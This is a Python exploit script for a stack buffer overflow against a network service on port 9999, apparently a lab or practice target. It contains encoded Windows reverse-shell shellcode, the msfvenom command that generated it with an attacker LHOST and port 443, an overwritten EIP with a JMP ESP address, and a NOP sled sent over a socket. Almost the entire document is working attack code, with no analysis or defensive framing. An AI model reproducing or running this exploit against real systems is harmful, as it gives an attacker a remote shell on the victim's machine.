#!/usr/bin/python

import socket 
import sys

host='192.168.187.128'
port=9999

if len(sys.argv) == 3:
    # sys.argv[0] <= python
    host=sys.argv[1]
    port=int(sys.argv[2])

# locate the pattern_create
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.187.134 LPORT=443 -f c -e
# x86/shikata_ga_nai -b "\x00\x0a\x0d"

shellCode =  ""
shellCode += "\xba\x44\xe7\x9c\xe3\xd9\xec\xd9\x74\x24\xf4\x5e\x31"
shellCode += "\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\xaa\x1b\x7e"
shellCode += "\x16\xce\x0c\xfd\xd9\x2e\xcd\x62\x53\xcb\xfc\xa2\x07"
shellCode += "\x98\xaf\x12\x43\xcc\x43\xd8\x01\xe4\xd0\xac\x8d\x0b"
shellCode += "\x50\x1a\xe8\x22\x61\x37\xc8\x25\xe1\x4a\x1d\x85\xd8"
shellCode += "\x84\x50\xc4\x1d\xf8\x99\x94\xf6\x76\x0f\x08\x72\xc2"
shellCode += "\x8c\xa3\xc8\xc2\x94\x50\x98\xe5\xb5\xc7\x92\xbf\x15"
shellCode += "\xe6\x77\xb4\x1f\xf0\x94\xf1\xd6\x8b\x6f\x8d\xe8\x5d"
shellCode += "\xbe\x6e\x46\xa0\x0e\x9d\x96\xe5\xa9\x7e\xed\x1f\xca"
shellCode += "\x03\xf6\xe4\xb0\xdf\x73\xfe\x13\xab\x24\xda\xa2\x78"
shellCode += "\xb2\xa9\xa9\x35\xb0\xf5\xad\xc8\x15\x8e\xca\x41\x98"
shellCode += "\x40\x5b\x11\xbf\x44\x07\xc1\xde\xdd\xed\xa4\xdf\x3d"
shellCode += "\x4e\x18\x7a\x36\x63\x4d\xf7\x15\xec\xa2\x3a\xa5\xec"
shellCode += "\xac\x4d\xd6\xde\x73\xe6\x70\x53\xfb\x20\x87\x94\xd6"
shellCode += "\x95\x17\x6b\xd9\xe5\x3e\xa8\x8d\xb5\x28\x19\xae\x5d"
shellCode += "\xa8\xa6\x7b\xf1\xf8\x08\xd4\xb2\xa8\xe8\x84\x5a\xa2"
shellCode += "\xe6\xfb\x7b\xcd\x2c\x94\x16\x34\xa7\x5b\x4e\x8d\xb1"
shellCode += "\x34\x8d\xf1\xbc\x7f\x18\x17\xd4\x6f\x4d\x80\x41\x09"
shellCode += "\xd4\x5a\xf3\xd6\xc2\x27\x33\x5c\xe1\xd8\xfa\x95\x8c"
shellCode += "\xca\x6b\x56\xdb\xb0\x3a\x69\xf1\xdc\xa1\xf8\x9e\x1c"
shellCode += "\xaf\xe0\x08\x4b\xf8\xd7\x40\x19\x14\x41\xfb\x3f\xe5"
shellCode += "\x17\xc4\xfb\x32\xe4\xcb\x02\xb6\x50\xe8\x14\x0e\x58"
shellCode += "\xb4\x40\xde\x0f\x62\x3e\x98\xf9\xc4\xe8\x72\x55\x8f"
shellCode += "\x7c\x02\x95\x10\xfa\x0b\xf0\xe6\xe2\xba\xad\xbe\x1d"
shellCode += "\x72\x3a\x37\x66\x6e\xda\xb8\xbd\x2a\xea\xf2\x9f\x1b"
shellCode += "\x63\x5b\x4a\x1e\xee\x5c\xa1\x5d\x17\xdf\x43\x1e\xec"
shellCode += "\xff\x26\x1b\xa8\x47\xdb\x51\xa1\x2d\xdb\xc6\xc2\x67"

EIP = 'A'*524
ESP = '\xf3\x12\x17\x31' #JMP ESP address
padding = '\x90' *16

shellCodefer=EIP + ESP +padding + shellCode

print "\n Attacker Start! "
print "Host: {} {}".format(host,port)
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "Fuzzing with %s bytes" % len(shellCodefer)
    connect = serverSocket.connect((host,port))
    data = serverSocket.recv(1024)
    serverSocket.send(shellCodefer)
    print "\n completed"
except socket.error as e:
    print "\error"+str(e)
finally:
    serverSocket.close
